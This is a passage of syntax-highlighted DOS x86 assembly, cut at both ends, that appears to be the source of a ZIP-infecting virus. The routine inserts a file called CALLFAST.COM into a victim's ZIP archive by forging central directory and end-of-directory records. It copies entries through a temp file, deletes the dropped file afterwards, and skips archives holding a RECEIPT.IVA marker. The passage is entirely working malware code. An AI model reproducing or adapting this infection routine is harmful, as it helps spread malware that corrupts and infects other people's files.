         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">
</span><span class="sc5">copy_callfas</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; Read one thousand and twenty-fou...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Read all of the file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_cds_</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to copy_cds_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes actually read</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_callfas</span><span class="sc0">
</span><span class="sc5">copy_cds_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">
</span><span class="sc5">cpy_cds_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = number of central directory...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; No central directory file header?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">wrt_last_cds</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to write_last_cds</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Decrease number of central direc...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store number of central director...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'KP'</span><span class="sc0">             </span><span class="sc1">; AX = low-order word of central d...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of central ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">         </span><span class="sc1">; AX = high-order word of central ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of central...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; Read forty-two bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; DX = offset of central directory...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = filename length</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = extra field length</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Add extra field length to filena...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = file comment length</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to read</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">      </span><span class="sc1">; DX = offset of central directory...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">      </span><span class="sc1">; Add size of central directory fi...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cpy_cds_loop</span><span class="sc0">
</span><span class="sc5">wrt_last_cds</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">      </span><span class="sc1">; AX = version made by (version 1....</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store version made by (version 1...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store version needed to extract (...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; AX = general purpose bit flag and...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store general purpose bit flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store compression method (the fil...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3021h</span><span class="sc0">        </span><span class="sc1">; AX = last modified file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store last modified file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ae1h</span><span class="sc0">        </span><span class="sc1">; AX = last modified file date</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store last modified file date</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of CRC-32 ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of compress...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of uncompre...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of compres...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of compres...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; AX = filename length (12 bytes)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store filename length (12 bytes)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; AX = extra field length, file co...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store extra field length (0 bytes)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store file comment length (0 bytes)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store disk number start (0 bytes)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store internal file attributes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">26h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of external...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of externa...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of offset of...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of relative...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of offset o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of relativ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">      </span><span class="sc1">; Write forty-six bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; Write twelve bytes</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'KP'</span><span class="sc0">             </span><span class="sc1">; AX = low-order word of end of ce...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of end of c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">605h</span><span class="sc0">         </span><span class="sc1">; AX = high-order word of end of c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of end of ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">      </span><span class="sc1">; Read eightteen bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; DX = offset of end of central di...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = zipfile comment length</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">      </span><span class="sc1">; DX = offset of zipfile comment</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = total number of entries in ...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase total number of entries...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store total number of entries in...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = total number of entries in ...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase total number of entries...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store total number of entries in...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of size of t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of size of ...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3ah</span><span class="sc0">      </span><span class="sc1">; Add size of central directory fi...</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of size of ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of size of...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of offset of...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of offset o...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; Add size of local file header to...</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = high-order word of filesize</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add high-order word of filesize ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add low-order word of filesize t...</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of offset o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of offset ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">      </span><span class="sc1">; Add size of end of central direc...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delete_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">test_receipt</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = found RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Didn't found RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exam_extra</span><span class="sc0">      </span><span class="sc1">; Zero? Jump to exam_extra</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">exam_extra</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = high-order word of extra field</span><span class="sc0">
